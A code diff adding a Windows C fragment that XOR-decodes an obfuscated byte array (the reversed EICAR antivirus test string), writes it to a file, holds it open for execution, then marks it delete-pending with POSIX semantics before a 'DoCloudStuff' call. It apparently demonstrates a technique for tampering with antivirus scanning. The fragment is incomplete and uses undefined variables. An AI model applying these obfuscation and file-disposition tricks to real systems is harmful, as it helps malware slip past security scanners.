@@ -1,0 +1,45 @@
+#define XOR_KEY 0x55
+
+void rev(char* s) {
+    int l = 0;
+    int r = strlen(s) - 1;
+    char t;
+    while (l < r) {
+        t = s[l];
+        s[l] = s[r];
+        s[r] = t;
+        l++;
+        r--;
+    }
+}
+
+
+unsigned char enc_payload[] = { 0x7f,0x1d,0x7e,0x1d,0x71,0x74,0x10,0x19,0x1c,0x13,0x78,0x01,0x06,0x10,0x01,0x78,0x06,0x00,0x07,0x1c,0x03,0x1c,0x01,0x1b,0x14,0x78,0x11,0x07,0x14,0x11,0x1b,0x14,0x01,0x06,0x78,0x07,0x14,0x16,0x1c,0x10,0x71,0x28,0x62,0x74,0x16,0x16,0x62,0x74,0x0b,0x05,0x7d,0x61,0x60,0x0d,0x0f,0x05,0x09,0x09,0x61,0x0e,0x05,0x14,0x15,0x70,0x05,0x74,0x1a,0x60,0x0d };
+
+
+char hola[] = "c0197c3cdb0d9b2f1a7a5c7c9f7b0f7f";
+rev(hola);
+
+
+char payload[sizeof(enc_payload) + 1];
+memset(payload, 0, sizeof(payload));
+for (int i = 0; i < sizeof(enc_payload); i++)
+    payload[i] = enc_payload[i] ^ XOR_KEY;
+
+DWORD nwf = 0;
+WriteFile(hfile, payload, sizeof(enc_payload), &nwf, NULL);
+
+
+CreateFile(foo, GENERIC_READ | FILE_EXECUTE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+if (WaitForSingleObject(gevent, 120000) != WAIT_OBJECT_0)
+{
+    printf("Parece que no esta todo bien");
+    return 1;
+}
+
+
+ IO_STATUS_BLOCK iostat = { 0 };
+    FILE_DISPOSITION_INFORMATION_EX fdiex = { 0x00000001 | 0x00000002 };
+    _NtSetInformationFile(hfile, &iostat, &fdiex, sizeof(fdiex), (FILE_INFORMATION_CLASS)64);
+    CloseHandle(hfile);
+    DoCloudStuff(workdir, filename, sizeof(hola) - 1);
